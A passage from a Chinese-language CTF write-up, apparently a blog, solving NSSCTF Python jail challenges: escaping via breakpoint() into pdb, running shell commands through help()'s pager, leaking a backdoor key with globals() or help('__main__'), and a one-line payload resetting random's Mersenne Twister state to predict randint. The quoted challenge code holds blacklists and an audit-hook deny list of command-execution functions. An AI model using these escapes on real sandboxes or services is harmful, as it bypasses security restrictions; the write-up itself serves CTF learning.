<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">filter</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
    BLACKLIST <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"exec"</span><span class="token punctuation">,</span><span class="token string">"input"</span><span class="token punctuation">,</span><span class="token string">"eval"</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> BLACKLIST<span class="token punctuation">:</span>
        <span class="token keyword">if</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token conversion-option punctuation">!r</span><span class="token punctuation">&#125;</span></span><span class="token string"> has been banned for security reasons'</span></span><span class="token punctuation">)</span>
            exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这过滤一加，既不能正常命令执行也不能通过再套一层的方式逃逸</p>
<p>这里也是一个姿势，利用<code>breakpoint()</code>，能够进入到pdb模块</p>
<blockquote>
<p>pdb 模块定义了一个交互式源代码调试器，用于 Python 程序。它支持在源码行间设置（有条件的）断点和单步执行，检视堆栈帧，列出源码列表，以及在任何堆栈帧的上下文中运行任意 Python 代码。它还支持事后调试，可以在程序控制下调用。</p>
</blockquote>
<p>所以进去pdb模块之后就可以正常进行命令执行了</p>
<p><img src="/blog/2023/06/07/python-jail/image-20230609151752104.png" alt="image-20230609151752104"></p>
<hr>
<h2 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/2912">level 3</a></h2><blockquote>
<p>限制长度+help()</p>
</blockquote>
<p>跟level2相比限制缩短到7，那level2.5的做法也失效了</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>input_data<span class="token punctuation">)</span><span class="token operator">></span><span class="token number">7</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Oh hacker!"</span><span class="token punctuation">)</span>
    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>这里要利用一个特殊的姿势，在python交互式终端中，<strong>可以通过<code>help</code>函数来进行RCE</strong></p>
<p>进入交互式后，随便查询一种用法</p>
<p>由于太多，会使用more进行展示，造成溢出</p>
<p>在后面使用<code>!命令</code>即可造成命令执行</p>
<p><img src="/blog/2023/06/07/python-jail/image-20230608190904819.png" alt="image-20230608190904819"></p>
<p><img src="/blog/2023/06/07/python-jail/image-20230608190658562.png" alt="image-20230608190658562"></p>
<hr>
<h2 id="lake-lake-lake"><a href="#lake-lake-lake" class="headerlink" title="lake lake lake"></a><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/2946">lake lake lake</a></h2><blockquote>
<p>全局变量泄露</p>
</blockquote>
<p>题目源码</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#it seems have a backdoor</span>
<span class="token comment">#can u find the key of it and use the backdoor</span>

fake_key_var_in_the_local_but_real_in_the_remote <span class="token operator">=</span> <span class="token string">"[DELETED]"</span>

<span class="token keyword">def</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    code <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token operator">></span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"you're hacker!"</span><span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">pass</span>

<span class="token keyword">def</span> <span class="token function">backdoor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Please enter the admin key"</span><span class="token punctuation">)</span>
    key <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>key <span class="token operator">==</span> fake_key_var_in_the_local_but_real_in_the_remote<span class="token punctuation">)</span><span class="token punctuation">:</span>
        code <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">)</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span><span class="token punctuation">:</span>
            <span class="token keyword">pass</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Nooo!!!!"</span><span class="token punctuation">)</span>

WELCOME <span class="token operator">=</span> <span class="token triple-quoted-string string">'''
  _       _          _       _          _       _        
 | |     | |        | |     | |        | |     | |       
 | | __ _| | _____  | | __ _| | _____  | | __ _| | _____ 
 | |/ _` | |/ / _ \ | |/ _` | |/ / _ \ | |/ _` | |/ / _ \
 | | (_| |   &lt;  __/ | | (_| |   &lt;  __/ | | (_| |   &lt;  __/
 |_|\__,_|_|\_\___| |_|\__,_|_|\_\___| |_|\__,_|_|\_\___|                                                                                                                                                                     
'''</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>WELCOME<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Now the program has two functions"</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"can you use dockerdoor"</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"1.func"</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"2.backdoor"</span><span class="token punctuation">)</span>
input_data <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>
<span class="token keyword">if</span><span class="token punctuation">(</span>input_data <span class="token operator">==</span> <span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    func<span class="token punctuation">(</span><span class="token punctuation">)</span>
    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
<span class="token keyword">elif</span><span class="token punctuation">(</span>input_data <span class="token operator">==</span> <span class="token string">"2"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    backdoor<span class="token punctuation">(</span><span class="token punctuation">)</span>
    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"not found the choice"</span><span class="token punctuation">)</span>
    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>可以看到一开始这里存在两个选项</p>
<p>选项1限制了长度不能超过9，这里尝试了一下发现<code>help()</code>函数在这里不可实现rce</p>
<p>所以这里得找另一个姿势进行绕过，此时我们发现选项2没有进行限制，但是需要<code>key</code>才能进入</p>
<p>而在源码中可以发现key是一个全局变量</p>
<p>所以我们可以在选项1中使用<code>globals()</code>函数读取全局变量获取到key的值</p>
<p>然后带上key的值进入选项2命令执行即可获取flag</p>
<p><img src="/blog/2023/06/07/python-jail/image-20230609201016178.png" alt="image-20230609201016178"></p>
<hr>
<h2 id="l-ke-l-ke-l-ke"><a href="#l-ke-l-ke-l-ke" class="headerlink" title="l@ke l@ke l@ke"></a><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/2947">l@ke l@ke l@ke</a></h2><blockquote>
<p>help()+<code>__main__</code>返回全局变量</p>
</blockquote>
<p>题目源码</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#it seems have a backdoor as `lake lake lake`</span>
<span class="token comment">#but it seems be limited!</span>
<span class="token comment">#can u find the key of it and use the backdoor</span>

fake_key_var_in_the_local_but_real_in_the_remote <span class="token operator">=</span> <span class="token string">"[DELETED]"</span>

<span class="token keyword">def</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    code <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token operator">></span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"you're hacker!"</span><span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">pass</span>

<span class="token keyword">def</span> <span class="token function">backdoor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Please enter the admin key"</span><span class="token punctuation">)</span>
    key <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>key <span class="token operator">==</span> fake_key_var_in_the_local_but_real_in_the_remote<span class="token punctuation">)</span><span class="token punctuation">:</span>
        code <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">)</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span><span class="token punctuation">:</span>
            <span class="token keyword">pass</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Nooo!!!!"</span><span class="token punctuation">)</span>

WELCOME <span class="token operator">=</span> <span class="token triple-quoted-string string">'''
  _         _          _         _          _         _        
 | |  ____ | |        | |  ____ | |        | |  ____ | |       
 | | / __ \| | _____  | | / __ \| | _____  | | / __ \| | _____ 
 | |/ / _` | |/ / _ \ | |/ / _` | |/ / _ \ | |/ / _` | |/ / _ \
 | | | (_| |   &lt;  __/ | | | (_| |   &lt;  __/ | | | (_| |   &lt;  __/
 |_|\ \__,_|_|\_\___| |_|\ \__,_|_|\_\___| |_|\ \__,_|_|\_\___|
     \____/               \____/               \____/                                                                                                                                                                                                                                        
'''</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>WELCOME<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Now the program has two functions"</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"can you use dockerdoor"</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"1.func"</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"2.backdoor"</span><span class="token punctuation">)</span>
input_data <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>
<span class="token keyword">if</span><span class="token punctuation">(</span>input_data <span class="token operator">==</span> <span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    func<span class="token punctuation">(</span><span class="token punctuation">)</span>
    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
<span class="token keyword">elif</span><span class="token punctuation">(</span>input_data <span class="token operator">==</span> <span class="token string">"2"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    backdoor<span class="token punctuation">(</span><span class="token punctuation">)</span>
    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"not found the choice"</span><span class="token punctuation">)</span>
    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>和上一题相比，把长度限制减少到6，于是不能直接用<code>globals</code>，<code>locals</code>函数，那只剩<code>help()</code>函数有突破口了</p>
<p>实际操作时发现<code>!sh</code>不能进到shell里面了，应该是做了手脚，这个方法行不通了</p>
<p>这里我们知道在<code>help()</code>中输入<code>os</code>的话可以得到os模块的帮助</p>
<p>那输入<code>__main__</code>的话，应该就能得到当前模块的帮助，包括当前模块的信息和全局变量</p>
<p><img src="/blog/2023/06/07/python-jail/image-20230708142212145.png" alt="image-20230708142212145"></p>
<p>成功拿到key</p>
<p>此外，由于脚本文件名字是叫<code>server.py</code>，所以我们也可以输入模块名<code>server</code>来得到模块信息</p>
<p>拿到flag</p>
<p><img src="/blog/2023/06/07/python-jail/image-20230708142656480.png" alt="image-20230708142656480"></p>
<hr>
<h2 id="laKe-laKe-laKe"><a href="#laKe-laKe-laKe" class="headerlink" title="laKe laKe laKe"></a><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/2984">laKe laKe laKe</a></h2><blockquote>
<p>随机数</p>
</blockquote>
<p>题目源码</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#You finsih these two challenge of leak</span>
<span class="token comment">#So cool</span>
<span class="token comment">#Now it's time for laKe!!!!</span>

<span class="token keyword">import</span> random
<span class="token keyword">from</span> io <span class="token keyword">import</span> StringIO
<span class="token keyword">import</span> sys
sys<span class="token punctuation">.</span>addaudithook

BLACKED_LIST <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'compile'</span><span class="token punctuation">,</span> <span class="token string">'eval'</span><span class="token punctuation">,</span> <span class="token string">'exec'</span><span class="token punctuation">,</span> <span class="token string">'open'</span><span class="token punctuation">]</span>

eval_func <span class="token operator">=</span> <span class="token builtin">eval</span>
open_func <span class="token operator">=</span> <span class="token builtin">open</span>

<span class="token keyword">for</span> m <span class="token keyword">in</span> BLACKED_LIST<span class="token punctuation">:</span>
    <span class="token keyword">del</span> __builtins__<span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span>m<span class="token punctuation">]</span>


<span class="token keyword">def</span> <span class="token function">my_audit_hook</span><span class="token punctuation">(</span>event<span class="token punctuation">,</span> _<span class="token punctuation">)</span><span class="token punctuation">:</span>
    BALCKED_EVENTS <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">'pty.spawn'</span><span class="token punctuation">,</span> <span class="token string">'os.system'</span><span class="token punctuation">,</span> <span class="token string">'os.exec'</span><span class="token punctuation">,</span> <span class="token string">'os.posix_spawn'</span><span class="token punctuation">,</span><span class="token string">'os.spawn'</span><span class="token punctuation">,</span><span class="token string">'subprocess.Popen'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> event <span class="token keyword">in</span> BALCKED_EVENTS<span class="token punctuation">:</span>
        <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">'Operation banned: &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">guesser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    game_score <span class="token operator">=</span> <span class="token number">0</span>
    sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'Can u guess the number? between 1 and 9999999999999 > '</span><span class="token punctuation">)</span>
    sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>
    right_guesser_question_answer <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">9999999999999</span><span class="token punctuation">)</span>
    sys<span class="token punctuation">.</span>stdout<span class="token punctuation">,</span> sys<span class="token punctuation">.</span>stderr<span class="token punctuation">,</span> challenge_original_stdout <span class="token operator">=</span> StringIO<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> StringIO<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> sys<span class="token punctuation">.</span>stdout

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        input_data <span class="token operator">=</span> eval_func<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
        sys<span class="token punctuation">.</span>stdout <span class="token operator">=</span> challenge_original_stdout
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Seems not right! please guess it!"</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> game_score
    sys<span class="token punctuation">.</span>stdout <span class="token operator">=</span> challenge_original_stdout

    <span class="token keyword">if</span> input_data <span class="token operator">==</span> right_guesser_question_answer<span class="token punctuation">:</span>
        game_score <span class="token operator">+=</span> <span class="token number">1</span>
    
    <span class="token keyword">return</span> game_score

WELCOME<span class="token operator">=</span><span class="token triple-quoted-string string">'''
  _       _  __      _       _  __      _       _  __    
 | |     | |/ /     | |     | |/ /     | |     | |/ /    
 | | __ _| ' / ___  | | __ _| ' / ___  | | __ _| ' / ___ 
 | |/ _` |  &lt; / _ \ | |/ _` |  &lt; / _ \ | |/ _` |  &lt; / _ \
 | | (_| | . \  __/ | | (_| | . \  __/ | | (_| | . \  __/
 |_|\__,_|_|\_\___| |_|\__,_|_|\_\___| |_|\__,_|_|\_\___|
                                                         
'''</span>

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>WELCOME<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Welcome to my guesser game!'</span><span class="token punctuation">)</span>
    game_score <span class="token operator">=</span> guesser<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> game_score <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'you are really super guesser!!!!'</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>open_func<span class="token punctuation">(</span><span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Guess game end!!!'</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    sys<span class="token punctuation">.</span>addaudithook<span class="token punctuation">(</span>my_audit_hook<span class="token punctuation">)</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>审计一下，发现<code>pty.spawn</code>、<code>os.system</code>、<code>os.exec</code>、<code>os.posix_spawn</code>、<code>os.spawn</code>、<code>subprocess.Popen</code>这些直接进行RCE的函数被过滤了，<code>compile</code>、<code>eval</code>、<code>exec</code>、<code>open</code>函数也被过滤了，看来RCE这条路是走不通了</p>
<p>而直接获得flag的方法是得到正确的随机数</p>
<p>这里随机数的生成是使用了<code>random.randint</code>方法</p>
<p>这里需要知道的是：python的<code>random</code>模块使用<a target="_blank" rel="noopener" href="https://badmonkey.site/archives/mt19937.html">梅森旋转法(MT19937)</a>来生成随机数，依赖于<code>getrandbits(32)</code>，每次产生32bit随机数，每产生624次随机数就转一转</p>
<p>我们先看一下<code>random</code>模块的所有方法</p>
<p><img src="/blog/2023/06/07/python-jail/image-20230708174043250.png" alt="image-20230708174043250"></p>
<p>发现里面存在<code>getstate</code>和<code>setstate</code>方法</p>
<p><code>getstate</code></p>
<blockquote>
<p>获取一个对象的内部状态（或称为状态信息），并返回一个包含状态信息的字典对象</p>
</blockquote>
<p><code>setstate</code></p>
<blockquote>
<p>设置一个对象的内部状态（或称为状态信息），以便将对象状态恢复到之前保存的状态</p>
</blockquote>
<p>因为随机数生成器每生成一次随机数都会更新一次状态，那我们只要让它生成随机数时在同一状态就能获取随机数了</p>
<p>所以整体流程为：</p>
<p>先拿到<code>random</code>模块，再<code>random.getstate()</code>拿到随机数生成器的状态，再通过<code>random.setstate()</code>置随机数生成器状态为生成随机数之前的状态，最后<code>random.randint</code>生成一模一样的随机数</p>
<p>但是这又引出两个问题：</p>
<ol>
<li>上述过程涉及多条语句的执行，但是pyjail只提供了一行<code>eval</code></li>
<li>如何恢复生成随机数之前的状态</li>
</ol>
<h3 id="多语句执行"><a href="#多语句执行" class="headerlink" title="多语句执行"></a>多语句执行</h3><p>对于第一个问题，</p>
<p>python 3.8还引入了<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/67192546">海象运算符</a><code>:=</code>：在表达式左侧应用海象运算符，可以将该表达式的值赋给某个变量</p>
<p>另外，我们还可以用一个list来装这些表达式，这样表达式的值就会从左至右依次计算，就像我们写程序一样一行一行地执行，要输出最后的值就在末尾加上一个<code>[-1]</code></p>
<p>对于函数的实现，我们可以借助lambda表达式来完成</p>
<h3 id="恢复生成随机数之前的状态"><a href="#恢复生成随机数之前的状态" class="headerlink" title="恢复生成随机数之前的状态"></a>恢复生成随机数之前的状态</h3><p>对于第二个问题，</p>
<p>我们先在本地测试一下，<code>import random</code>并打印<code>random.getstate</code>，发现返回一个元组</p>
<p><img src="/blog/2023/06/07/python-jail/image-20230708175446163.png" alt="image-20230708175446163"></p>
<p>大致返回内容为：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">,</span> <span class="token number">624</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>…的部分是624个32位整数</p>
<p>很明显，这里第一个取值<code>3</code>和第三个取值<code>None</code>都是固定的</p>
<p>现在我们调用一次<code>random.getrandbits(32)</code>，再查看<code>random.getstate</code></p>
<p>可以发现内容变成了</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>前面省略号的值也发生了变化（转过了）</p>
<p>那我们直接让计数器的值为0，这样在下一次执行<code>random.getrandbits(32)</code>的时候值就会变成1</p>
<p>所以payload的大致思路是：</p>
<ol>
<li><p>使用 <code>__import__(&#39;random&#39;)</code> 导入 <code>random</code> 模块，并将其赋值给变量 <code>random</code></p>
</li>
<li><p>使用 <code>random.getstate()</code> 方法获取当前的随机数生成器状态，并将其赋值给变量 <code>state</code></p>
</li>
<li><p>使用 <code>state[1]</code> 切片获取随机数生成器状态元组的前 624 个元素，并将其转换为列表，并将其赋值给变量 <code>pre_state</code>。（因为梅森旋转法伪随机数生成器的内部状态包含了 624 个整数，其中前 624 个整数用于生成下一个随机数）</p>
</li>
<li><p>使用 <code>(3,tuple(pre_state+[0]),None)</code> 构造一个新的状态元组，其中第一个元素是一个常数 3，第二个元素是 <code>pre_state</code> 列表中的 624 个整数和一个 0 组成的元组，第三个元素为 <code>None</code>。这个新的状态元组用于设置随机数生成器的状态</p>
</li>
<li><p>使用 <code>random.setstate()</code> 方法将新的状态元组设置为随机数生成器的状态</p>
</li>
<li><p>使用 <code>random.randint(1, 9999999999999)</code> 生成一个随机整数，并将其输出</p>
</li>
</ol>
<p>payload：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">[</span>random<span class="token operator">:=</span><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'random'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> state<span class="token operator">:=</span>random<span class="token punctuation">.</span>getstate<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> pre_state<span class="token operator">:=</span><span class="token builtin">list</span><span class="token punctuation">(</span>state<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">624</span><span class="token punctuation">]</span><span class="token punctuation">,</span> random<span class="token punctuation">.</span>setstate<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token builtin">tuple</span><span class="token punctuation">(</span>pre_state<span class="token operator">+</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">9999999999999</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="法2："><a href="#法2：" class="headerlink" title="法2："></a>法2：</h3><p>在下一题中发现RCE部分多加了一个，所以这题应该是可以利用<code>cpython._PySys_ClearAuditHooks</code>获取flag的</p>
<p><a target="_blank" rel="noopener" href="https://ctftime.org/writeup/21982">参考文章</a></p>
<p>payload回头有时间再研究下（</p>
<hr>
<h2 id="lak3-lak3-lak3"><a href="#lak3-lak3-lak3" class="headerlink" title="lak3 lak3 lak3"></a><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/2987">lak3 lak3 lak3</a></h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#Hi hackers,lak3 comes back</span>
<span class="token comment">#Have a good luck on it! :Wink:</span>

<span class="token keyword">import</span> random
<span class="token keyword">from</span> io <span class="token keyword">import</span> StringIO
<span class="token keyword">import</span> sys
sys<span class="token punctuation">.</span>addaudithook

BLACKED_LIST <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'compile'</span><span class="token punctuation">,</span> <span class="token string">'eval'</span><span class="token punctuation">,</span> <span class="token string">'exec'</span><span class="token punctuation">]</span>

eval_func <span class="token operator">=</span> <span class="token builtin">eval</span>
open_func <span class="token operator">=</span> <span class="token builtin">open</span>

<span class="token keyword">for</span> m <span class="token keyword">in</span> BLACKED_LIST<span class="token punctuation">:</span>
